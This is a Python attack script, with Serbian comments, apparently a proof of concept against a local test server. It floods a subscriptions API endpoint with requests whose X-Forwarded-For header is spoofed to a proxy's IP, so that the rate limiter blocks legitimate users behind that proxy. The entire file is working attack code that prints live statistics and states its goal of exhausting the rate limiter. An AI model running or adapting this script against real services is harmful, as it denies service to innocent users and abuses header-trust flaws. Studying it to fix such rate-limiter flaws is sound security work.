#!/usr/bin/env python3
import requests
import time
import sys
from threading import Thread, Lock

# Server configuration
BASE_URL = "http://localhost:8082"
PROXY_IP = "203.0.113.50"  # IP našeg "reverse proxy-ja"

# Attack configuration
TOTAL_REQUESTS = 100  # Dovoljno da ispunimo rate limiter
TARGET_ENDPOINT = "/api/subscriptions/"

# Statistics
stats_lock = Lock()
stats = {
    'sent': 0,
    'success': 0,
    'rate_limited': 0,
    'errors': 0,
    'start_time': None
}

def print_stats():
    """Background thread koji prikazuje statistiku svakih 2 sekunde"""
    while True:
        time.sleep(2)
        with stats_lock:
            elapsed = time.time() - stats['start_time'] if stats['start_time'] else 0
            print(f"\nSTATISTICS (after {elapsed:.1f}s):")
            print(f"  Sent: {stats['sent']}")
            print(f"Success (200): {stats['success']}")
            print(f"Rate Limited (429): {stats['rate_limited']}")
            print(f"Errors: {stats['errors']}")
            
            if stats['rate_limited'] > 0:
                print(f"\nPROXY IP IS BEING RATE LIMITED!")
                print(f"Legitimate users behind proxy {PROXY_IP} are now BLOCKED!")

def send_attack_request():
    """
    Šalje zahtev pretvarajući se da dolazi od proxy-ja.
    Postavlja X-Forwarded-For na IP našeg proxy-ja.
    """
    headers = {
        'X-Forwarded-For': PROXY_IP,  # Pretvaramo se da smo proxy!
        'User-Agent': 'Attacker-Impersonating-Proxy/1.0'
    }
    
    try:
        response = requests.get(
            BASE_URL + TARGET_ENDPOINT,
            headers=headers,
            timeout=5
        )
        
        with stats_lock:
            stats['sent'] += 1
            
            if response.status_code == 200:
                stats['success'] += 1
            elif response.status_code == 429:
                stats['rate_limited'] += 1
            else:
                stats['errors'] += 1
                
    except requests.exceptions.Timeout:
        with stats_lock:
            stats['sent'] += 1
            stats['errors'] += 1
    except Exception as e:
        with stats_lock:
            stats['sent'] += 1
            stats['errors'] += 1

def main():
    print("=" * 70)
    print("=" * 70)
    print(f"\nTarget: {BASE_URL}")
    print(f"Impersonating Proxy IP: {PROXY_IP}")
    print(f"Total Requests: {TOTAL_REQUESTS}")
    print(f"\nGOAL: Exhaust rate limiter for proxy IP and block legitimate users")
    print("\nStarting attack in 3 seconds...")
    print("Press Ctrl+C to stop early.\n")
    
    try:
        time.sleep(3)
    except KeyboardInterrupt:
        sys.exit(0)
    
    # Pokreni background thread za statistiku
    stats['start_time'] = time.time()
    stats_thread = Thread(target=print_stats, daemon=True)
    stats_thread.start()
    
    
    try:
        # Šalji zahteve brzo, bez pauze
        for i in range(TOTAL_REQUESTS):
            send_attack_request()
            
            # Samo kratka pauza da ne zakačimo mrežu
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        print("\nAttack interrupted by user (Ctrl+C)")
    
    # Finalna statistika
    elapsed = time.time() - stats['start_time']
    print("\n" + "=" * 70)
    print("FINAL STATISTICS")
    print("=" * 70)
    print(f"Duration: {elapsed:.2f} seconds")
    print(f"Total Requests Sent: {stats['sent']}")
    print(f"Successful (200): {stats['success']}")
    print(f"Rate Limited (429): {stats['rate_limited']}")
    print(f"Errors: {stats['errors']}")
    print(f"Requests/sec: {stats['sent']/elapsed:.2f}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
